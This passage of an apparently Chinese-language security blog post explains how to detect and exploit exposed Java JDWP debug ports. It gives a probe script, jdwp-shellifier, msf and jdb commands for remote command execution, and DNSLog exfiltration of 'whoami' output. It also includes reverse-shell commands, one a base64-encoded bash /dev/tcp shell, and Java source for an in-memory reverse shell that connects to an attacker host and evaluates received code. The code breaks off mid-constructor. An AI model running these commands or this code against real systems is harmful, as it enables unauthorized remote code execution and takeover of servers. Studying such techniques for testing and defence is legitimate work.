+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>使用Telnet命令探测，需要马上输入<code>JDWP-Handshake</code>，然后服务端返回一样的内容，证明是JDWP服务：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181551520.webp" alt="image-20241118155100421" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181551520.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181551520.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181551520.webp?size=large 2x" data-title="image-20241118155100421" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="脚本" class="heading-element"><span>脚本</span>
+  <a href="#%e8%84%9a%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>使用如下脚本扫描也可以，直接连接目标服务发送<code>JDWP-Handshake</code>，然后接受到相同内容则说明是JDWP服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">socket</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">socket</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">socket</span>()
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">connect</span>((<span style="color:#a6be9d">&#34;127.0.0.1&#34;</span>, <span style="color:#a6be9d">8000</span>))
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">send</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#34;JDWP-Handshake&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">recv</span>(<span style="color:#a6be9d">1024</span>) <span style="color:#ff636f">==</span> <span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#34;JDWP-Handshake&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#34;[*]JDWP Service!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">close</span>()</span></span></code></pre></div><h2 id="漏洞利用" class="heading-element"><span>漏洞利用</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>漏洞利用可借助以下三个工具。</p>
+<h3 id="jdwp-shellifier" class="heading-element"><span>jdwp-shellifier</span>
+  <a href="#jdwp-shellifier" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>直接用GitHub上已有的工具：https://github.com/IOActive/jdwp-shellifier</p>
+<p>该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。</p>
+<p>需要Python2运行。</p>
+<p>默认break on是在java.net.ServerSocket.accept方法上，</p>
+<pre tabindex="0"><code>python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd &#34;calc&#34;</code></pre><p>直接设置断点函数为<code>java.lang.String.indexOf</code>会更快速：</p>
+<pre tabindex="0"><code>python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#34;java.lang.String.indexOf&#34; --cmd &#34;calc&#34;</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553789.webp" alt="image-20241118155301596" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553789.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553789.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553789.webp?size=large 2x" data-title="image-20241118155301596" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但是前面的命令虽然执行了但是看不到回显，在Linux环境下可以利用DNSLog外带回显：</p>
+<pre tabindex="0"><code>python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#34;java.lang.String.indexOf&#34; --cmd &#34;ping -nc 1 `whoami`.xxx.dnslog.cn&#34;</code></pre><p>反弹shell：</p>
+<pre tabindex="0"><code>python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#34;java.lang.String.indexOf&#34; --cmd &#34;ncat -lvvp 1234 -e /bin/bash&#34;
+# 下面这种不能直接运行/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&gt;&amp;1来反弹
+# 跟Java的exec()反弹一个原理，可用Base64绕过
+python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on &#34;java.lang.String.indexOf&#34; --cmd &#34;bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}&#34;</code></pre><h3 id="msf" class="heading-element"><span>msf</span>
+  <a href="#msf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在msf中可以使用<code>exploit/multi/misc/java_jdwp_debugger</code>模块进行攻击利用。</p>
+<p>原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。</p>
+<h3 id="jdb" class="heading-element"><span>jdb</span>
+  <a href="#jdb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>jdb是JDK中自带的命令行调试工具。</p>
+<p>这里是按照msf中的方式搞：</p>
+<ol>
+<li>attach到远程JDWP服务；</li>
+<li><code>threads</code>命令查看所有线程，查找sleeping的线程；</li>
+<li><code>thread sleeping的线程id</code>，然后<code>stepi</code>进入该线程；</li>
+<li>通过<code>print|dump|eval</code>命令，执行Java表达式从而达成命令执行；</li>
+</ol>
+<p>这里本地<code>-attach</code>参数连接会出差，换为下面的方式：</p>
+<pre tabindex="0"><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000</code></pre><p>执行命令：</p>
+<pre tabindex="0"><code>eval java.lang.Runtime.getRuntime().exec(&#34;calc&#34;)</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553903.webp" alt="image-20241118155318694" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553903.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553903.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181553903.webp?size=large 2x" data-title="image-20241118155318694" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>当然是可以实现直接回显的</p>
+<h1 id="代码执行反弹shell" class="heading-element"><span>代码执行&amp;反弹shell</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e5%8f%8d%e5%bc%b9shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><a href="https://xz.aliyun.com/news/12607"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/12607</a></p>
+<p>这里作者给了一个工具：https://github.com/l3yx/jdwp-codeifier</p>
+<pre tabindex="0"><code>//命令执行
+python2 jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m command -c &#39;touch /tmp/success&#39;
+python2 jdwp-codeifier.py -t 172.17.0.3 -p 5005 -m command2 -c &#39;ls&#39;
+
+//代码执行
+python2 jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m code -c &#39;new java.util.Scanner(new java.lang.ProcessBuilder(&#34;sh&#34;,&#34;-c&#34;,&#34;whoami&#34;).start().getInputStream()).useDelimiter(&#34;--!@#&#34;).next()&#39;
+
+
+//反弹shell
+python2 jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m rshell -a 172.17.0.2:8080 -l 0.1
+# -a 指定接收shell的地址
+# -l 指定shell与服务器连接不上时的最大存活时间（分钟）（每隔5秒自动重连）</code></pre><p>所谓内存马，应该一般都指内存WebShell，这块已经有非常多的研究文章了。但如果放到JDWP漏洞中来看，可能并不一定适用，因为存在漏洞的应用本身或许不是一个Web应用。而这种情况下无论是通过常规意义上的反弹shell还是下载二进制木马进行进一步利用，都是一个敏感且高危的操作，可能被RASP拦截或者被入侵检测发现。</p>
+<p>既然可以执行Java代码，那么其实可以在Java进程中启动一个线程，通过自定义的逻辑，去反弹出一个执行Java代码的&quot;Shell&quot;，具体实现如下：</p>
+<p>服务端通过nc监听即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">org.example</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.script.ScriptEngine</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.script.ScriptEngineManager</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.BufferedReader</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.InputStreamReader</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.PrintWriter</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.InetAddress</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.Socket</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.time.Duration</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.time.LocalDateTime</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">App</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">Thread</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">ScriptEngine</span> <span style="color:#58a1dd">scriptEngine</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">host</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">Integer</span> <span style="color:#58a1dd">port</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">Double</span> <span style="color:#58a1dd">life</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">execCode</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">code</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">code</span>.<span style="color:#58a1dd">trim</span>().<span style="color:#58a1dd">equals</span>(<span style="color:#a6be9d">&#34;&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#a6be9d">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">result</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">scriptEngine</span>.<span style="color:#58a1dd">eval</span>(<span style="color:#58a1dd">code</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">result</span> <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#58a1dd">result</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;\n&#34;</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#a6be9d">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">e</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;\n&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">getInfo</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">info</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;  os: &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">getProperty</span>(<span style="color:#a6be9d">&#34;os.name&#34;</span>) <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34; &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">getProperty</span>(<span style="color:#a6be9d">&#34;os.arch&#34;</span>) <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34; &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">getProperty</span>(<span style="color:#a6be9d">&#34;os.version&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">info</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;\n&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">info</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;user: &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">getProperty</span>(<span style="color:#a6be9d">&#34;user.name&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">info</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;\n&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">info</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;host: &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">InetAddress</span>.<span style="color:#58a1dd">getLocalHost</span>().<span style="color:#58a1dd">getHostName</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">info</span> <span style="color:#ff636f">+=</span> <span style="color:#a6be9d">&#34;host: &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">e</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">info</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">run</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">boolean</span> <span style="color:#58a1dd">exit</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">LocalDateTime</span> <span style="color:#58a1dd">time</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LocalDateTime</span>.<span style="color:#58a1dd">now</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">while</span> (<span style="color:#58a1dd">Duration</span>.<span style="color:#58a1dd">between</span>(<span style="color:#58a1dd">time</span>, <span style="color:#58a1dd">LocalDateTime</span>.<span style="color:#58a1dd">now</span>()).<span style="color:#58a1dd">toMillis</span>() <span style="color:#ff636f">/</span> (<span style="color:#58a1dd">60</span>.<span style="color:#58a1dd">0</span> <span style="color:#ff636f">*</span> <span style="color:#58a1dd">1000</span>.<span style="color:#58a1dd">0</span>) <span style="color:#ff636f">&lt;</span> <span style="color:#58a1dd">life</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#ff636f">!</span><span style="color:#58a1dd">exit</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">Socket</span> <span style="color:#58a1dd">socket</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Socket</span>(<span style="color:#58a1dd">host</span>, <span style="color:#58a1dd">port</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">PrintWriter</span> <span style="color:#58a1dd">out</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">PrintWriter</span>(<span style="color:#58a1dd">socket</span>.<span style="color:#58a1dd">getOutputStream</span>());
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">BufferedReader</span> <span style="color:#58a1dd">in</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">BufferedReader</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">InputStreamReader</span>(<span style="color:#58a1dd">socket</span>.<span style="color:#58a1dd">getInputStream</span>()));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">scriptEngine</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ScriptEngineManager</span>().<span style="color:#58a1dd">getEngineByName</span>(<span style="color:#a6be9d">&#34;js&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">getInfo</span>() <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;\n\n&gt;&gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">flush</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">input</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">while</span> ((<span style="color:#58a1dd">input</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">in</span>.<span style="color:#58a1dd">readLine</span>()) <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">time</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LocalDateTime</span>.<span style="color:#58a1dd">now</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">input</span>.<span style="color:#58a1dd">trim</span>().<span style="color:#58a1dd">equals</span>(<span style="color:#a6be9d">&#34;exit&#34;</span>) <span style="color:#ff636f">||</span> <span style="color:#58a1dd">input</span>.<span style="color:#58a1dd">trim</span>().<span style="color:#58a1dd">equals</span>(<span style="color:#a6be9d">&#34;exit()&#34;</span>)) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">exit</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">true</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">socket</span>.<span style="color:#58a1dd">close</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff636f">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">execCode</span>(<span style="color:#58a1dd">input</span>) <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;&gt;&gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">flush</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>                ;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#ff636f">!</span><span style="color:#58a1dd">exit</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">Thread</span>.<span style="color:#58a1dd">sleep</span>(<span style="color:#58a1dd">5</span> <span style="color:#ff636f">*</span> <span style="color:#58a1dd">1000</span>);
+</span></span><span style="display:flex;"><span>                } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">InterruptedException</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>                    ;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">App</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">host</span>, <span style="color:#58a1dd">Integer</span> <span style="color:#58a1dd">port</span>, <span style="color:#58a1dd">Double</span> <span style="color:#58a1dd">life</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">host</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">host</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">port</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">port</span>;
